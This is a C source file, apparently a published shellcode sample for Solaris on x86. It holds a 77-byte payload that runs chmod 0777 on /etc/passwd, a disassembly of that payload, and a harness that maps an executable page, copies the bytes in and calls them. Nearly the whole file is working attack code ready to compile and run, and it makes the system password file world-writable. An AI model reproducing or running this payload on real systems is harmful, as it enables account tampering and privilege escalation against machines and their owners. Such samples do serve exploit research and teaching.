#include <stdio.h>
#include <string.h>

#if (defined __sun || defined __FreeBSD__)
# include <strings.h>
#endif

#include <unistd.h>
#include <sys/mman.h>
#include <sys/utsname.h>

/*
 * SunOS (Solaris) / x86 '/usr/bin/chmod 0777 /etc/passwd' 77 bytes shellcode
 *
 * Paulus Gandung Prakosa <gandung@lists.infradead.org>
 *
 * Tested on: SunOS solaris-vagrant 5.11 11.4.0.15.0 i86pc i386 i86pc
 *
 * Disassembly of section .text:
 *
 * 08050428 <_start>:
 * 8050428:       33 f6                   xor    %esi,%esi
 * 805042a:       56                      push   %esi
 * 805042b:       68 73 73 77 64          push   $0x64777373
 * 8050430:       68 63 2f 70 61          push   $0x61702f63
 * 8050435:       68 2f 2f 65 74          push   $0x74652f2f
 * 805043a:       8b dc                   mov    %esp,%ebx
 * 805043c:       33 c9                   xor    %ecx,%ecx
 * 805043e:       41                      inc    %ecx
 * 805043f:       41                      inc    %ecx
 * 8050440:       ba ff ff ff ff          mov    $0xffffffff,%edx
 * 8050445:       33 c0                   xor    %eax,%eax
 * 8050447:       b0 44                   mov    $0x44,%al
 * 8050449:       56                      push   %esi
 * 805044a:       51                      push   %ecx
 * 805044b:       53                      push   %ebx
 * 805044c:       52                      push   %edx
 * 805044d:       50                      push   %eax
 * 805044e:       cd 91                   int    $0x91
 * 8050450:       8b f8                   mov    %eax,%edi
 * 8050452:       33 c9                   xor    %ecx,%ecx
 * 8050454:       66 b9 ff 01             mov    $0x1ff,%cx
 * 8050458:       56                      push   %esi
 * 8050459:       56                      push   %esi
 * 805045a:       51                      push   %ecx
 * 805045b:       53                      push   %ebx
 * 805045c:       57                      push   %edi
 * 805045d:       33 c0                   xor    %eax,%eax
 * 805045f:       b0 65                   mov    $0x65,%al
 * 8050461:       50                      push   %eax
 * 8050462:       cd 91                   int    $0x91
 * 8050464:       56                      push   %esi
 * 8050465:       57                      push   %edi
 * 8050466:       33 c0                   xor    %eax,%eax
 * 8050468:       b0 06                   mov    $0x6,%al
 * 805046a:       50                      push   %eax
 * 805046b:       cd 91                   int    $0x91
 * 805046d:       56                      push   %esi
 * 805046e:       56                      push   %esi
 * 805046f:       33 c0                   xor    %eax,%eax
 * 8050471:       b0 01                   mov    $0x1,%al
 * 8050473:       cd 91                   int    $0x91
 */

#ifndef unused
# define unused(x) ((void)(x))
#endif

int main(int argc, char **argv)
{
	unused(argc);
	unused(argv);

	struct utsname uts;
	char *pcall;
	char *shellcode = "\x33\xf6\x56\x68\x73\x73\x77\x64"
                          "\x68\x63\x2f\x70\x61\x68\x2f\x2f"
                          "\x65\x74\x8b\xdc\x33\xc9\x41\x41"
                          "\xba\xff\xff\xff\xff\x33\xc0\xb0"
                          "\x44\x56\x51\x53\x52\x50\xcd\x91"
                          "\x8b\xf8\x33\xc9\x66\xb9\xff\x01"
                          "\x56\x56\x51\x53\x57\x33\xc0\xb0"
                          "\x65\x50\xcd\x91\x56\x57\x33\xc0"
                          "\xb0\x06\x50\xcd\x91\x56\x56\x33"
                          "\xc0\xb0\x01\xcd\x91";

	pcall = mmap(
		NULL,
		sysconf(_SC_PAGESIZE),
		PROT_WRITE | PROT_EXEC,
		MAP_ANONYMOUS | MAP_PRIVATE,
		-1,
		0
	);

	if (pcall == MAP_FAILED) {
		perror("mmap()");
		return -1;
	}

	bzero(&uts, sizeof(struct utsname));

	if (uname(&uts) < 0) {
		perror("uname()");
		munmap(pcall, sysconf(_SC_PAGESIZE));
		return -1;
	}

	printf("[*] Machine info\n");
	printf(" [*] sys: %s\n", uts.sysname);
	printf(" [*] node: %s\n", uts.nodename);
	printf(" [*] release: %s\n", uts.release);
	printf(" [*] version: %s\n", uts.version);
	printf(" [*] machine: %s\n", uts.machine);

	printf("[*] Copying shellcode into crafted buffer.\n");
	memcpy(pcall, shellcode, strlen(shellcode));

	printf("[*] Executing the shellcode..\n");
	__asm__ __volatile__(
		"call *%%eax\r\n"
		:
		: "a"(pcall)
	);

	printf("[*] Cleaning up..\n");
	munmap(pcall, sysconf(_SC_PAGESIZE));

	return 0;
}
